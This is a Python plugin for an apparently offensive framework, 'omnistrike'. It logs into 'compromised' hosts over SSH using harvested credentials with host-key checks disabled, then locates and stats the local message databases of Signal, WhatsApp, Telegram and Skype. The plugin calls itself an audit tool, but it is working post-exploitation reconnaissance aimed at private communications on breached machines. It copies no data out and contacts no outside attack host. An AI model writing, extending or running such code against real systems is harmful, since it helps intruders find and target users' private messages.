import asyncio
import asyncssh
from omnistrike.plugins.base import BasePlugin

class MessagingAuditorPlugin(BasePlugin):
    def __init__(self):
        # Common locations for encrypted messaging app databases (Linux/Desktop focus)
        self.app_targets = [
            {"name": "Signal", "path": "~/.config/Signal/sql/db.sqlite", "type": "SQLite"},
            {"name": "WhatsApp Desktop", "path": "~/.config/WhatsApp/Partitions/*/Local Storage/leveldb", "type": "LevelDB"},
            {"name": "Telegram Desktop", "path": "~/.local/share/TelegramDesktop/tdata", "type": "Proprietary"},
            {"name": "Skype", "path": "~/.config/skypeforlinux/databases", "type": "SQLite"}
        ]

    @property
    def name(self):
        return "SecureMessagingAuditor"

    @property
    def description(self):
        return "Audits local data storage of encrypted messaging apps for metadata and plaintext exposure."

    async def run(self, target, data):
        compromised_hosts = data.get('compromised_hosts', {})
        if not compromised_hosts:
            return

        print(f"[*] Starting SecureMessagingAuditor on {len(compromised_hosts)} host(s)...")
        messaging_results = {}

        for ip, creds in compromised_hosts.items():
            for cred in creds:
                if cred['service'] == 'ssh':
                    print(f"[*] Auditing local messaging artifacts on {ip}...")
                    findings = []
                    try:
                        async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
                            for app in self.app_targets:
                                # Check if path exists
                                cmd = f"ls -d {app['path']} 2>/dev/null"
                                result = await conn.run(cmd)
                                if result.stdout:
                                    # Perform metadata extraction (example: file size and last modified)
                                    cmd = f"stat {app['path']} 2>/dev/null"
                                    stat_res = await conn.run(cmd)
                                    findings.append({
                                        "app": app['name'],
                                        "storage_type": app['type'],
                                        "path": result.stdout.strip(),
                                        "metadata": stat_res.stdout.strip() if stat_res.stdout else "Accessible"
                                    })
                                    print(f"    [!] Found {app['name']} storage at {result.stdout.strip()}")

                        if findings:
                            messaging_results[ip] = findings
                        break
                    except Exception as e:
                        print(f"[!] MessagingAuditor failed on {ip}: {e}")

        data['messaging_artifacts'] = messaging_results
